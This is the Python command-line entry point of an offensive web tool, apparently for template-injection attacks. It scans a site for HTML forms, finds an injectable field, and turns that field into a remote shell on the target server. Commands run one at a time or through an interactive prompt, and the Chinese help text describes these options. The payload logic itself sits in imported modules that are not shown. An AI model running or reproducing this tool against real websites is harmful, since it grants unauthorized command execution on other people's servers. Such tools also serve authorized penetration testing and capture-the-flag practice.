import logging
from urllib.parse import urlparse
from traceback import print_exc

from .form import Form
from .form_cracker import FormCracker
from .scan_url import yield_form
from .requester import Requester, DEFAULT_USER_AGENT
from .colorize import colored
import click

TITLE = colored("yellow", r"""
    ____             _ _            
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ / 
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /  
              /___/        /____/   
""".strip("\n"), bold=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(levelname)s:[%(name)s] | %(message)s"
)
logger = logging.getLogger("cli")


def interact(cmd_exec):
    logger.info(f"Use {colored('cran', 'Ctrl+D', bold=True)} to exit.")
    while True:
        try:
            cmd = input("$>> ")
        except EOFError:
            break
        except KeyboardInterrupt:
            break
        try:
            result = cmd_exec(cmd)
            print(result)
        except Exception:
            print_exc()


@click.group()
def main():
    pass


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
def crack(url, action, method, inputs, exec_cmd, interval, user_agent):
    print(TITLE)
    assert all(param is not None for param in [
               url, inputs]), "Please check your param"
    form = Form(
        action=action or urlparse(url)[3],
        method=method,
        inputs=inputs.split(",")
    )
    requester = Requester(interval=interval, user_agent=user_agent)
    cracker = FormCracker(url=url, form=form, requester=requester)
    result = cracker.crack()
    if result is None:
        logger.warning("Test form failed...")
        return
    payload_gen, field = result

    def cmd_exec_func(cmd):
        r = cracker.submit(
            {field: payload_gen(cmd)})
        assert r is not None
        return r.text
    if exec_cmd == "":
        interact(cmd_exec_func)
    else:
        print(cmd_exec_func(exec_cmd))
    logger.warning("Bye!")


@main.command()
@click.option("--url", "-u", help="需要扫描的URL")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
def scan(url, exec_cmd, interval, user_agent):
    print(TITLE)
    requester = Requester(interval=interval, user_agent=user_agent)
    for page_url, forms in yield_form(requester, url):
        for form in forms:
            cracker = FormCracker(url=url, form=form, requester=requester)
            result = cracker.crack()
            if result is None:
                continue
            payload_gen, field = result

            def cmd_exec_func(cmd):
                r = cracker.submit(
                    {field: payload_gen(cmd)})
                assert r is not None
                return r.text
            if exec_cmd == "":
                interact(cmd_exec_func)
            else:
                print(cmd_exec_func(exec_cmd))
            return
    logger.warning("Scan failed...")


if __name__ == '__main__':
    main()
